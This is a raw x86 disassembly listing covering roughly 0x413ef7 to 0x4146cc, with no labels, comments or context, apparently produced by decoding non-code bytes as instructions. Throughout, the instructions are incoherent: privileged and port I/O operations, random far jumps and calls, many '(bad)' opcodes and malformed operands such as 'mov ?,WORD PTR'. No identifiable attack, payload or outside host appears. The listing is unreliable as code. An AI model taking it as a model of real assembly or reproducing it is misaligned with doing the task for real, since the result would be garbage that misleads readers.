  413ef7:	ins    BYTE PTR es:[edi],dx
  413ef8:	dec    esp
  413ef9:	jno    0x413eb3
  413efb:	pop    edi
  413efc:	dec    edi
  413efd:	push   ebp
  413efe:	sub    eax,0x8fcca654
  413f03:	pop    ds
  413f04:	js     0x413f45
  413f06:	or     DWORD PTR [eax+0x487665e1],ecx
  413f0c:	sysenter 
  413f0e:	fisub  DWORD PTR [esi]
  413f10:	arpl   dx,di
  413f12:	adc    cl,ch
  413f14:	pop    ebp
  413f15:	adc    al,0x79
  413f17:	mov    eax,ds:0xbc53b077
  413f1c:	cwde   
  413f1d:	pop    ebp
  413f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f1f:	dec    edx
  413f20:	out    dx,eax
  413f21:	add    BYTE PTR [eax-0x1a],al
  413f24:	ret    0xdcf3
  413f27:	add    bh,dh
  413f29:	mov    ch,0xe2
  413f2b:	data16 fidivr DWORD PTR [ebp+0x10]
  413f2f:	push   ebp
  413f30:	mul    DWORD PTR [esp+edx*1]
  413f33:	mov    eax,0xa05b967d
  413f38:	ss push es
  413f3a:	jbe    0x413ed4
  413f3c:	imul   esp,esp,0x9b2fa6ae
  413f42:	and    ecx,DWORD PTR [eax-0x51]
  413f45:	hlt    
  413f46:	lahf   
  413f47:	or     eax,0x8e48ee61
  413f4c:	retf   0x333d
  413f4f:	sbb    eax,0x7974a5af
  413f54:	and    BYTE PTR [edi+ecx*1+0x62],0x7c
  413f59:	adc    BYTE PTR [ebp+0x1fc1526d],0xd2
  413f60:	xchg   edx,eax
  413f61:	int3   
  413f62:	mov    al,0xe1
  413f64:	loopne 0x413f7a
  413f66:	out    0xc5,eax
  413f68:	adc    DWORD PTR [edx+0xcc88b85],ebp
  413f6e:	mov    bh,ah
  413f70:	or     ebx,0x10
  413f73:	fild   DWORD PTR [esi-0x77]
  413f76:	ret    
  413f77:	pop    ebp
  413f78:	xchg   ebx,eax
  413f79:	shl    BYTE PTR [ebx-0x676980e5],0xd7
  413f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f81:	jle    0x413f11
  413f83:	mov    WORD PTR [ecx+0x66],cs
  413f86:	(bad)  
  413f88:	mov    ch,BYTE PTR [edi+0x2d5a25d2]
  413f8e:	mov    eax,0x11afadf7
  413f93:	je     0x413f6a
  413f95:	sub    BYTE PTR ds:0x9cc8b4ba,dl
  413f9b:	cmp    DWORD PTR [eax+0x280f7b93],eax
  413fa1:	cmp    bh,BYTE PTR [edi-0x2]
  413fa4:	add    cl,BYTE PTR [esi+0x27cbdd45]
  413faa:	add    eax,0xf62c207
  413faf:	jns    0x413fa8
  413fb1:	(bad)  
  413fb2:	loop   0x413fb0
  413fb4:	shr    BYTE PTR [eax],cl
  413fb6:	aaa    
  413fb7:	lds    edi,FWORD PTR [eax+0x5d45001d]
  413fbd:	sar    DWORD PTR [edx+0x7621020],1
  413fc3:	add    al,0x7e
  413fc5:	xchg   esp,eax
  413fc6:	fwait
  413fc7:	outs   dx,DWORD PTR ds:[esi]
  413fc8:	rol    al,cl
  413fca:	daa    
  413fcb:	daa    
  413fcc:	jne    0x413fbb
  413fce:	mov    ch,0x62
  413fd0:	mov    eax,ds:0x8677d42
  413fd5:	shl    DWORD PTR [esi],cl
  413fd7:	ins    DWORD PTR es:[edi],dx
  413fd8:	in     eax,dx
  413fd9:	sbb    ah,BYTE PTR [edi-0x62]
  413fdc:	mov    dh,0x98
  413fde:	xor    edi,eax
  413fe0:	push   eax
  413fe1:	add    DWORD PTR [esi],ecx
  413fe3:	int3   
  413fe4:	cmc    
  413fe5:	test   al,0xb3
  413fe7:	add    al,0x8b
  413fe9:	test   al,0x76
  413feb:	stos   DWORD PTR es:[edi],eax
  413fec:	adc    DWORD PTR [esp+eax*8],edx
  413fef:	jge    0x413f84
  413ff1:	leave  
  413ff2:	addr16 jo 0x413ff7
  413ff5:	pop    ss
  413ff6:	je     0x41405b
  413ff8:	push   edx
  413ff9:	push   ecx
  413ffa:	mov    ds:0xb8c606af,eax
  413fff:	pop    ebx
  414000:	sub    bh,BYTE PTR [ecx]
  414002:	arpl   WORD PTR [edx],dx
  414004:	xlat   BYTE PTR ds:[ebx]
  414005:	test   cl,al
  414007:	dec    esi
  414008:	ret    0x5bfc
  41400b:	lock or BYTE PTR [edi],0x74
  41400f:	retf   
  414010:	add    edi,DWORD PTR [edi+0x39]
  414013:	mov    dl,0x5
  414015:	xchg   esi,eax
  414016:	outs   dx,BYTE PTR ds:[esi]
  414017:	stc    
  414018:	sbb    bh,dh
  41401a:	out    dx,eax
  41401b:	lahf   
  41401c:	lods   al,BYTE PTR ds:[esi]
  41401d:	in     al,dx
  41401e:	(bad)  
  41401f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414020:	mov    ah,0x5d
  414022:	xchg   ebp,eax
  414023:	shl    dl,0x55
  414026:	cli    
  414027:	cmp    DWORD PTR [edi+0xd3592b5],esp
  41402d:	ja     0x413ffa
  41402f:	icebp  
  414030:	mov    bh,0x49
  414032:	dec    ebx
  414033:	jg     0x413feb
  414035:	xor    BYTE PTR [edx+0x1e6ece59],0x5
  41403c:	mov    edi,0xcce89480
  414041:	pop    ss
  414042:	fwait
  414043:	lea    edx,[ebp+0x41a5c6ba]
  414049:	(bad)
  41404d:	inc    ebp
  41404e:	aas    
  41404f:	idiv   dh
  414051:	popa   
  414052:	add    edi,0xda53e5
  414058:	rol    DWORD PTR [ebx+0x10845182],cl
  41405e:	inc    eax
  41405f:	in     eax,0x48
  414061:	repnz push edx
  414063:	outs   dx,DWORD PTR ds:[esi]
  414064:	bound  esp,QWORD PTR [ebx+0x4]
  414067:	push   esp
  414068:	xchg   ecx,eax
  414069:	mov    dh,0xe
  41406b:	in     al,0x34
  41406d:	and    ecx,DWORD PTR [eax]
  41406f:	push   edx
  414070:	test   dl,ch
  414072:	aaa    
  414073:	add    eax,0xb9ed9a24
  414078:	lea    edx,[ecx+0x38e2a1e4]
  41407e:	cmp    DWORD PTR [ecx+edi*8+0x50],edx
  414082:	in     al,dx
  414083:	lods   eax,DWORD PTR ds:[esi]
  414084:	leave  
  414085:	mov    ch,0xa5
  414087:	jae    0x4140d0
  414089:	push   ss
  41408a:	mov    eax,0xbc59b2b
  41408f:	and    al,0x51
  414091:	addr16 ret 0xc74d
  414095:	jecxz  0x41402a
  414097:	mov    cl,0xa2
  414099:	and    eax,0x5ea603e0
  41409e:	mov    al,ds:0x11761312
  4140a3:	add    cl,BYTE PTR [ebx+0x354e4955]
  4140a9:	repnz test DWORD PTR [ebp+0x7a80e016],esi
  4140b0:	std    
  4140b1:	or     bl,0x3b
  4140b4:	jne    0x4140ec
  4140b6:	lods   al,BYTE PTR ds:[esi]
  4140b7:	and    BYTE PTR [edi+0x66],dl
  4140ba:	sub    al,0x1b
  4140bc:	stc    
  4140bd:	xchg   ebx,eax
  4140be:	jmp    0xd595ffba
  4140c3:	mov    dl,0x28
  4140c5:	jle    0x4140c9
  4140c7:	imul   BYTE PTR [ebx+0x52aa5b6d]
  4140cd:	add    DWORD PTR [ecx],edi
  4140cf:	mov    ebp,0xa2a1a5f9
  4140d4:	gs int3 
  4140d6:	imul   ecx,DWORD PTR ds:0xafc77fed,0xffffffc4
  4140dd:	push   ss
  4140de:	fld    TBYTE PTR ds:0x70c245ee
  4140e4:	ds dec esi
  4140e6:	cli    
  4140e7:	xor    DWORD PTR [ebx-0x7b],ebp
  4140ea:	dec    edi
  4140eb:	mov    eax,ds:0x62c8a412
  4140f0:	das    
  4140f1:	xchg   ebx,eax
  4140f2:	jnp    0x4140b8
  4140f4:	repz inc ebp
  4140f6:	cmc    
  4140f7:	cli    
  4140f8:	add    cl,BYTE PTR [ebx+0x4f]
  4140fb:	mov    dh,0x73
  4140fd:	loope  0x414094
  4140ff:	mov    edi,0x48ec0c63
  414104:	sub    eax,0x61b21c0a
  414109:	fs scas eax,DWORD PTR es:[edi]
  41410b:	outs   dx,DWORD PTR ds:[esi]
  41410c:	xor    al,0x7f
  41410e:	push   0xf687468f
  414113:	ins    DWORD PTR es:[edi],dx
  414114:	pop    edx
  414115:	and    cl,BYTE PTR [edi+ecx*8-0x62c3b69b]
  41411c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411d:	aas    
  41411e:	out    0xf,al
  414120:	int3   
  414121:	ins    BYTE PTR es:[edi],dx
  414122:	out    dx,al
  414123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414124:	cmc    
  414125:	test   eax,0xb5399a65
  41412a:	sbb    BYTE PTR [edi+0x3e],al
  41412d:	xchg   ebx,eax
  41412e:	pop    ds
  41412f:	scas   eax,DWORD PTR es:[edi]
  414130:	pop    ss
  414131:	neg    BYTE PTR [edi]
  414133:	stos   DWORD PTR es:[edi],eax
  414134:	adc    ah,BYTE PTR [ebx+0x71]
  414137:	cmc    
  414138:	aad    0x4f
  41413a:	in     al,0x97
  41413c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41413d:	jle    0x41415f
  41413f:	prefetcht2 BYTE PTR [ecx+eiz*2-0x5d7658b9]
  414147:	out    dx,al
  414148:	stc    
  414149:	les    ecx,FWORD PTR [ebp-0x3e0e688e]
  41414f:	rcr    edx,0x71
  414152:	test   ch,dl
  414154:	mov    esp,0x2b3f7cf
  414159:	test   BYTE PTR [edi],bl
  41415b:	fld    QWORD PTR [esi-0x50]
  41415e:	out    dx,al
  41415f:	sbb    BYTE PTR [ebx+0x21dd35e2],0x29
  414166:	lock dec esp
  414168:	rol    DWORD PTR [edx+0x1a054d16],0x5e
  41416f:	mov    eax,ds:0x3156173d
  414174:	xchg   ebx,eax
  414175:	pushf  
  414176:	fdiv   DWORD PTR [eax]
  414178:	int3   
  414179:	pop    ebp
  41417a:	into   
  41417b:	xchg   ecx,eax
  41417c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41417d:	or     al,0xef
  41417f:	stos   BYTE PTR es:[edi],al
  414180:	gs cmp bl,dl
  414183:	out    0x50,eax
  414185:	jmp    0xed03bab2
  41418a:	ins    BYTE PTR es:[edi],dx
  41418b:	pop    ss
  41418c:	dec    edi
  41418d:	stc    
  41418e:	popa   
  41418f:	stos   DWORD PTR es:[edi],eax
  414190:	fiadd  WORD PTR [edx-0x42]
  414193:	retf   0x6162
  414196:	mov    ds:0x26a82a93,eax
  41419b:	jno    0x4141b3
  41419d:	mov    DWORD PTR [esi+esi*1+0x2d],0x5b953f16
  4141a5:	fs push cs
  4141a7:	add    ebp,DWORD PTR [ebx-0x1a26abf7]
  4141ad:	xor    cl,dl
  4141af:	loope  0x41422e
  4141b1:	sub    esi,0x2d6c6061
  4141b7:	mov    ?,WORD PTR [edi-0x7e]
  4141ba:	ret    
  4141bb:	xchg   edx,eax
  4141bc:	dec    ebp
  4141bd:	(bad)  
  4141bf:	fisubr DWORD PTR [edx+0x58]
  4141c2:	cmc    
  4141c3:	jg     0x4141cf
  4141c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c6:	mov    BYTE PTR [eax-0xc],cl
  4141c9:	les    esi,FWORD PTR [ecx+0x7e9d5218]
  4141cf:	push   cs
  4141d0:	mov    ebp,0xecba954
  4141d5:	sbb    eax,0x8ca09be2
  4141da:	jb     0x4141e2
  4141dc:	dec    esp
  4141dd:	test   al,0x76
  4141df:	mov    ebp,eax
  4141e1:	pop    edi
  4141e2:	and    al,0x46
  4141e4:	gs aas 
  4141e6:	int3   
  4141e7:	push   ebp
  4141e8:	test   eax,0xc5d750b3
  4141ed:	or     BYTE PTR [edi+eiz*2-0x38],0xbe
  4141f2:	fs mov ebp,0x4ebd7064
  4141f8:	dec    eax
  4141f9:	outs   dx,DWORD PTR ds:[esi]
  4141fa:	push   esi
  4141fb:	mov    bh,0x9e
  4141fd:	mov    ds:0xfa134c41,eax
  414202:	sub    DWORD PTR [eax],eax
  414204:	int    0x1d
  414206:	cmp    ah,ch
  414208:	xlat   BYTE PTR ds:[ebx]
  414209:	mov    ds,WORD PTR [esi-0x67]
  41420c:	mov    ds:0x9ffbc248,al
  414211:	lea    ebx,[ecx]
  414213:	or     edi,DWORD PTR [edx]
  414215:	(bad)  
  414216:	jecxz  0x4141c4
  414218:	xor    ecx,DWORD PTR [ebx+0x388a391a]
  41421e:	scas   eax,DWORD PTR es:[edi]
  41421f:	loop   0x4141a5
  414221:	and    BYTE PTR [edi+0x10fd716c],cl
  414227:	cld    
  414228:	mov    eax,0x9e2aee96
  41422d:	jecxz  0x4141b1
  41422f:	cmp    al,0x8e
  414231:	inc    edi
  414232:	lock ss call 0xcaf9d52d
  414239:	sbb    DWORD PTR es:[edx],esi
  41423c:	stos   BYTE PTR es:[edi],al
  41423d:	pop    ss
  41423e:	lds    eax,FWORD PTR [ebx+0x22a1c414]
  414244:	fwait
  414245:	pop    ss
  414246:	fnsave [ecx+0x3e]
  414249:	cmp    eax,0x799044fb
  41424e:	scas   al,BYTE PTR es:[edi]
  41424f:	in     al,0x7
  414251:	call   0xc430:0x72f74d3
  414258:	xchg   edx,eax
  414259:	outs   dx,DWORD PTR ds:[esi]
  41425a:	mov    ch,0x4c
  41425c:	push   cs
  41425d:	add    esp,DWORD PTR [ebx]
  41425f:	lea    ebp,[ecx-0x23566fcd]
  414265:	mov    ds,WORD PTR [ebp-0x73]
  414268:	push   cs
  414269:	pop    es
  41426a:	popf   
  41426b:	inc    esi
  41426c:	fistp  WORD PTR [eax+eax*2-0x75460887]
  414273:	and    ecx,ecx
  414275:	dec    bh
  414277:	(bad)  [ecx-0x3d]
  41427a:	fbld   TBYTE PTR [ebp+0x6d977145]
  414280:	loopne 0x4142f6
  414282:	imul   BYTE PTR [edi+0x9]
  414285:	sub    ah,BYTE PTR [eax]
  414287:	jo     0x4142b4
  414289:	int3   
  41428a:	jp     0x4142a5
  41428c:	mov    eax,DWORD PTR [eax+0x22c22ef5]
  414292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414293:	mov    WORD PTR [esi+eax*2+0x7e],ss
  414297:	in     al,0x95
  414299:	in     al,0x89
  41429b:	and    ah,BYTE PTR [ebp-0x40c92c5a]
  4142a1:	pusha  
  4142a2:	push   esi
  4142a3:	mov    ebx,0xa7796df1
  4142a8:	push   ecx
  4142a9:	push   ss
  4142aa:	out    dx,eax
  4142ab:	stos   BYTE PTR es:[edi],al
  4142ac:	sub    eax,0xd439401f
  4142b1:	adc    dh,BYTE PTR [edx-0x290cd1ba]
  4142b7:	sbb    ch,BYTE PTR [edx+0xa66d2bb]
  4142bd:	(bad)  [eax+0x116d8893]
  4142c3:	loopne 0x4142c5
  4142c5:	jl     0x414255
  4142c7:	pushf  
  4142c8:	ins    DWORD PTR es:[edi],dx
  4142c9:	int3   
  4142ca:	push   esi
  4142cb:	(bad)  
  4142cc:	js     0x414287
  4142ce:	cmp    BYTE PTR [ebx+0x2f],bl
  4142d1:	sbb    edx,DWORD PTR [eax]
  4142d3:	aas    
  4142d4:	mov    al,0xc
  4142d6:	(bad)  
  4142d7:	dec    esi
  4142d8:	sub    DWORD PTR [edx+0x3aea01a],ecx
  4142de:	fadd   QWORD PTR [ebp-0x5]
  4142e1:	dec    edx
  4142e2:	aas    
  4142e3:	or     al,0x1e
  4142e5:	push   ebp
  4142e6:	outs   dx,BYTE PTR ds:[esi]
  4142e7:	pop    ss
  4142e8:	add    DWORD PTR [edx+0x73bbf2fe],ecx
  4142ee:	loope  0x414335
  4142f0:	sub    dh,ch
  4142f2:	js     0x4142f9
  4142f4:	stc    
  4142f5:	sbb    esp,DWORD PTR [ebx-0x1]
  4142f8:	sbb    ebp,ecx
  4142fa:	xchg   esp,eax
  4142fb:	jbe    0x414280
  4142fd:	ret    0x476
  414300:	sub    WORD PTR ds:0x32cc43fd,si
  414307:	mov    bl,dh
  414309:	loopne 0x414352
  41430b:	mov    eax,ds:0xf81d4b9
  414310:	shl    dh,cl
  414312:	shr    ebp,1
  414314:	jnp    0x414395
  414316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414317:	repz or BYTE PTR [ebp+0x4b0ae14],cl
  41431e:	mov    ds:0xec60540,eax
  414323:	fs push edx
  414325:	jbe    0x414385
  414327:	push   ebx
  414328:	pop    ebx
  414329:	popa   
  41432a:	int    0x86
  41432c:	adc    dl,al
  41432e:	arpl   cx,bx
  414330:	in     eax,0xe4
  414332:	jbe    0x414308
  414334:	gs out 0x6e,eax
  414337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414338:	mov    edx,DWORD PTR [ebx-0x33]
  41433b:	test   al,bh
  41433d:	mov    ebx,0xefec9cd9
  414342:	lds    eax,FWORD PTR [esi-0x5e]
  414345:	pop    esi
  414346:	les    ebp,FWORD PTR [eax]
  414348:	xchg   edx,eax
  414349:	stos   BYTE PTR es:[edi],al
  41434a:	sbb    cl,BYTE PTR [eax+0x2e]
  41434d:	pop    cx
  41434f:	pop    esi
  414350:	push   ebp
  414351:	or     DWORD PTR [ebp+0x68f659f2],eax
  414357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414358:	call   0xfec16ab0
  41435d:	jo     0x4143bf
  41435f:	and    esp,edi
  414361:	dec    ebp
  414362:	out    0xee,al
  414364:	test   ax,0xc05f
  414368:	mov    ds,WORD PTR es:0x38a172e0
  41436f:	js     0x414387
  414371:	pushf  
  414372:	cmc    
  414373:	xchg   ebx,eax
  414374:	fisttp DWORD PTR [edx+ebx*1+0x49]
  414378:	pop    edx
  414379:	xor    eax,0x87ca7353
  41437e:	xchg   ebp,eax
  41437f:	test   ebp,eax
  414381:	push   es
  414382:	push   0xe3c7a056
  414387:	out    0xea,eax
  414389:	pop    eax
  41438a:	cwde   
  41438b:	sub    ecx,0xffffffc7
  41438e:	adc    esp,edi
  414390:	add    dl,0xbf
  414393:	sbb    edx,DWORD PTR [ecx-0x232abb50]
  414399:	(bad)  
  41439a:	and    ebx,esi
  41439c:	fcom   DWORD PTR [esi]
  41439e:	ror    BYTE PTR [esp+edx*2-0x37],1
  4143a2:	rcl    edi,1
  4143a4:	lods   eax,DWORD PTR ds:[esi]
  4143a5:	mov    edx,0x8121fd8b
  4143aa:	mov    edx,0x1215c1e4
  4143af:	int    0xca
  4143b1:	lods   eax,DWORD PTR ds:[esi]
  4143b2:	cli    
  4143b3:	xchg   edi,eax
  4143b4:	pop    es
  4143b5:	iret   
  4143b6:	adc    esi,DWORD PTR [edi-0x59]
  4143b9:	inc    esi
  4143ba:	into   
  4143bb:	sbb    eax,0x4d586678
  4143c0:	ins    BYTE PTR es:[edi],dx
  4143c1:	pusha  
  4143c2:	bound  ebx,QWORD PTR [edi]
  4143c4:	push   es
  4143c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143c6:	repnz push esp
  4143c8:	push   ds
  4143c9:	or     bl,dl
  4143cb:	mov    eax,esp
  4143cd:	push   0xb85fca28
  4143d2:	cld    
  4143d3:	aaa    
  4143d4:	stc    
  4143d5:	imul   esi,DWORD PTR [esi],0x7a71b13b
  4143db:	test   al,0xae
  4143dd:	inc    DWORD PTR [ecx]
  4143df:	sub    eax,0xaf0adf3a
  4143e4:	scas   eax,DWORD PTR es:[edi]
  4143e5:	push   ds
  4143e6:	xor    DWORD PTR [edi],ebp
  4143e8:	call   0x4ea4:0xda3858e8
  4143ef:	sub    ch,BYTE PTR [ebp+0x40b40c75]
  4143f5:	cli    
  4143f6:	adc    ebx,DWORD PTR [eax-0x7a]
  4143f9:	jecxz  0x414420
  4143fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143fc:	jmp    0x939a:0x54939c4f
  414403:	push   eax
  414404:	int    0xf4
  414406:	cs pop ecx
  414408:	or     esp,esi
  41440a:	mov    al,0xa3
  41440c:	xor    BYTE PTR [edx-0x5b],dh
  41440f:	and    eax,0x91602209
  414414:	fcomp  QWORD PTR [ebx-0x4fe2f996]
  41441a:	push   ecx
  41441b:	xor    bl,BYTE PTR ds:0x812a486b
  414421:	mov    bh,0x2c
  414423:	fld    QWORD PTR [esi]
  414425:	mov    eax,ds:0x7ccce88a
  41442a:	test   DWORD PTR [ebx-0x51],0x6fa3ef35
  414431:	xchg   edi,eax
  414432:	dec    ebp
  414433:	push   ss
  414434:	push   cs
  414435:	add    edx,DWORD PTR [edi]
  414437:	add    eax,0xca884caa
  41443c:	pop    ss
  41443d:	dec    ebp
  41443e:	aad    0x5e
  414440:	dec    ecx
  414441:	gs jmp 0x4c9567cd
  414447:	inc    esp
  414448:	fwait
  414449:	push   0x7590a872
  41444e:	popf   
  41444f:	and    ecx,DWORD PTR [esi]
  414451:	test   DWORD PTR [ebx+0x65],0xccfbe105
  414458:	push   0x13af0162
  41445d:	adc    al,0x4
  41445f:	sbb    eax,0xf4514297
  414464:	jmp    0x4b53:0x368f7d21
  41446b:	jne    0x414417
  41446d:	retf   0x1a81
  414470:	ss push ebx
  414472:	sahf   
  414473:	mov    ch,0x4
  414475:	push   0x1162c1e3
  41447a:	neg    DWORD PTR [edx+0x21]
  41447d:	jmp    0x41448f
  41447f:	lock cmp al,0x98
  414482:	lods   eax,DWORD PTR ds:[esi]
  414483:	xchg   ah,cl
  414485:	cmp    eax,0xb5227666
  41448a:	(bad)  
  41448b:	sub    dl,BYTE PTR [esi-0x1b]
  41448e:	and    eax,0x226dbd49
  414493:	xor    eax,DWORD PTR [ebx-0x69]
  414496:	pop    es
  414497:	jmp    0xe138ceca
  41449c:	xchg   ebx,eax
  41449d:	add    DWORD PTR [esi+0x3e],edx
  4144a0:	mov    BYTE PTR gs:[ebp+ebp*2-0x6f91dfd6],dh
  4144a8:	dec    esp
  4144a9:	adc    DWORD PTR [ecx],eax
  4144ab:	(bad)  
  4144ac:	xchg   esi,eax
  4144ad:	retf   
  4144ae:	jno    0x41447c
  4144b0:	lods   al,BYTE PTR ds:[esi]
  4144b1:	gs adc ebx,esp
  4144b4:	(bad)  
  4144b5:	dec    esi
  4144b6:	adc    eax,0xcb8490fd
  4144bb:	inc    edx
  4144bc:	dec    esp
  4144bd:	xor    ebx,DWORD PTR [ecx+ebp*2-0xa]
  4144c1:	adc    BYTE PTR [esi-0x108119a],cl
  4144c7:	lods   eax,DWORD PTR ds:[esi]
  4144c8:	mov    BYTE PTR ds:0x2597b8cf,al
  4144ce:	push   0x347e2f25
  4144d3:	and    dh,0x26
  4144d6:	mov    BYTE PTR [ebp+0x11],bh
  4144d9:	pop    eax
  4144da:	lds    eax,FWORD PTR [eax]
  4144dc:	push   esp
  4144dd:	call   0xf4964dc0
  4144e2:	in     eax,0xc3
  4144e4:	mov    ds:0x3bae6a6b,eax
  4144e9:	enter  0x7de,0xce
  4144ed:	xchg   esp,ecx
  4144ef:	dec    ecx
  4144f0:	shl    DWORD PTR [esi-0x2e778bf3],cl
  4144f6:	repz cmp bl,bh
  4144f9:	xor    DWORD PTR [ecx+eax*1-0x52],esi
  4144fd:	lock jl 0x414568
  414500:	clc    
  414501:	or     DWORD PTR [ebx-0x63a74b10],0xffffffdf
  414508:	or     al,0x6a
  41450a:	or     edx,DWORD PTR [ebp-0x3034f49d]
  414510:	xchg   esp,eax
  414511:	sub    dl,ch
  414513:	pushf  
  414514:	xchg   edx,eax
  414515:	(bad)  
  414516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414517:	xchg   ebp,eax
  414518:	repz int 0x1d
  41451b:	rcr    BYTE PTR [ecx+0x39],1
  41451e:	sbb    cl,dh
  414520:	(bad)  
  414522:	or     esi,ecx
  414524:	test   DWORD PTR [eax],ebp
  414526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414527:	dec    eax
  414528:	xchg   ebp,eax
  414529:	mov    ecx,0x21ebd86d
  41452e:	aad    0x51
  414530:	push   es
  414531:	(bad)  
  414532:	std    
  414533:	out    0xc2,al
  414535:	sar    DWORD PTR [edx-0x4d],0x3e
  414539:	scas   eax,DWORD PTR es:[edi]
  41453a:	in     eax,0xcf
  41453c:	jecxz  0x414553
  41453e:	sahf   
  41453f:	jmp    0x50f4:0xd7eb0ffe
  414546:	(bad)  
  414547:	or     BYTE PTR [esp+edx*2],bh
  41454a:	xor    dl,dh
  41454c:	fsubr  st,st(7)
  41454e:	push   edx
  41454f:	push   0x1214949
  414554:	push   ebx
  414555:	nop
  414556:	test   al,0x3d
  414558:	test   al,0x69
  41455a:	popa   
  41455b:	ds stc 
  41455d:	pop    ss
  41455e:	push   ecx
  41455f:	les    esp,FWORD PTR ds:0x5226085
  414565:	inc    ebp
  414566:	xchg   BYTE PTR ds:0xe94518ba,bh
  41456c:	(bad)  
  41456d:	ds mov eax,cr3
  414571:	xchg   esi,eax
  414572:	jb     0x4145b9
  414574:	je     0x414550
  414576:	cli    
  414577:	and    dh,ah
  414579:	mov    ecx,0xc7c67d2f
  41457e:	(bad)  
  41457f:	lods   al,BYTE PTR ds:[esi]
  414580:	mov    eax,DWORD PTR [ebp+0x72ac6b60]
  414586:	add    ah,al
  414588:	mov    dh,0x61
  41458a:	sbb    BYTE PTR [ecx+0x78ef0d69],cl
  414590:	mov    ch,0x69
  414592:	adc    edi,DWORD PTR [esi-0x43b8154b]
  414598:	xchg   esp,eax
  414599:	pop    esi
  41459a:	mov    BYTE PTR [ebp-0x66],dh
  41459d:	scas   al,BYTE PTR es:[edi]
  41459e:	test   BYTE PTR [ebx+eiz*1-0x55bf01d4],dh
  4145a5:	jne    0x414591
  4145a7:	jno    0x414533
  4145a9:	mov    cl,0x78
  4145ab:	aad    0x1e
  4145ad:	(bad)  
  4145ae:	push   cs
  4145af:	xor    BYTE PTR [ebx-0x1795b7a0],cl
  4145b5:	sub    eax,0x8514ed8
  4145ba:	into   
  4145bb:	out    0xcd,eax
  4145bd:	or     BYTE PTR [ecx-0x3],ch
  4145c0:	mov    WORD PTR [esi-0x6706e836],cs
  4145c6:	and    ebx,ecx
  4145c8:	mov    bh,0xd3
  4145ca:	sbb    dh,BYTE PTR [eax]
  4145cc:	in     eax,dx
  4145cd:	test   BYTE PTR ds:[ebx+0x5b04facb],ch
  4145d4:	iret   
  4145d5:	sub    ecx,DWORD PTR [edx-0x6]
  4145d8:	pop    es
  4145d9:	pmullw mm5,mm6
  4145dc:	mov    eax,ds:0xc0f959ca
  4145e1:	inc    ebx
  4145e2:	push   edx
  4145e3:	sbb    edx,DWORD PTR [esi-0x1ecf417e]
  4145e9:	data16 lods al,BYTE PTR ds:[esi]
  4145eb:	ss das 
  4145ed:	mov    dh,0x78
  4145ef:	std    
  4145f0:	cmp    eax,0xf6a8a469
  4145f5:	rol    DWORD PTR [ebx],cl
  4145f7:	cmc    
  4145f8:	xchg   edx,eax
  4145f9:	je     0x414625
  4145fb:	mov    eax,ds:0x95c62d48
  414600:	mov    bh,0xa1
  414602:	rol    DWORD PTR [ecx+0x49],cl
  414605:	fwait
  414606:	repz pop ebx
  414608:	retf   
  414609:	loopne 0x414590
  41460b:	test   ebx,ecx
  41460d:	pushf  
  41460e:	cdq    
  41460f:	cmp    eax,0x8204f97d
  414614:	push   esi
  414615:	mov    ds:0x31bf9b00,al
  41461a:	fiadd  WORD PTR [edi+0x6e7e1b5b]
  414620:	mov    ds:0x56b14e0a,al
  414625:	lods   al,BYTE PTR ds:[esi]
  414626:	jo     0x41464b
  414628:	cmp    BYTE PTR [ebx+eax*2+0x19],0x7c
  41462d:	push   eax
  41462e:	popa   
  41462f:	lahf   
  414630:	int3   
  414631:	adc    eax,0x55e90ffc
  414636:	cmp    dl,al
  414638:	in     al,dx
  414639:	fmul   QWORD PTR [edx]
  41463b:	test   al,0x72
  41463d:	fdivr  DWORD PTR [ecx]
  41463f:	push   0x769a3bc0
  414644:	sbb    cl,BYTE PTR ds:[edx+0x30f53fda]
  41464b:	or     al,0xf3
  41464d:	pop    ecx
  41464e:	lahf   
  41464f:	mov    ds:0x5170ea1e,eax
  414654:	mov    ?,ecx
  414656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414657:	ss adc eax,0xa808a9db
  41465d:	mov    bh,0x3c
  41465f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414660:	ja     0x4145fc
  414662:	push   ebx
  414663:	xor    DWORD PTR [edx-0x59e5d041],0xeb0e57b3
  41466d:	retf   
  41466e:	xor    edi,DWORD PTR [ebp+0x5]
  414671:	ins    BYTE PTR es:[edi],dx
  414672:	sahf   
  414673:	addr16 inc eax
  414675:	(bad)  
  414676:	push   0xac0e9de8
  41467b:	jo     0x414667
  41467d:	pop    edx
  41467e:	popf   
  41467f:	cmp    DWORD PTR [edi],esp
  414681:	xchg   eax,edx
  414683:	or     ch,cl
  414685:	enter  0xf61c,0xd1
  414689:	adc    BYTE PTR [ebp-0x7e858f73],ah
  41468f:	hlt    
  414690:	and    ch,BYTE PTR [ebx-0x2e]
  414693:	or     DWORD PTR [esi],ecx
  414695:	mov    eax,ds:0xa8581a3a
  41469a:	retf   
  41469b:	mov    ds:0x3e05ac20,eax
  4146a0:	jno    0x414707
  4146a2:	pusha  
  4146a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a4:	jmp    0xa2ec:0x9eb6b86c
  4146ab:	mov    edx,0x1576a091
  4146b0:	mov    esp,0xf0f29815
  4146b5:	cmp    al,0x64
  4146b7:	jne    0x414724
  4146b9:	pop    eax
  4146ba:	ret    0x892f
  4146bd:	ins    DWORD PTR es:[edi],dx
  4146be:	addr16 mov bh,0x32
  4146c1:	jno    0x414690
  4146c3:	sbb    ebx,DWORD PTR [ebp-0x21b1e48d]
  4146c9:	mov    bl,0x53
  4146cb:	(bad)  
  4146cc:	stos   BYTE PTR es:[edi],al
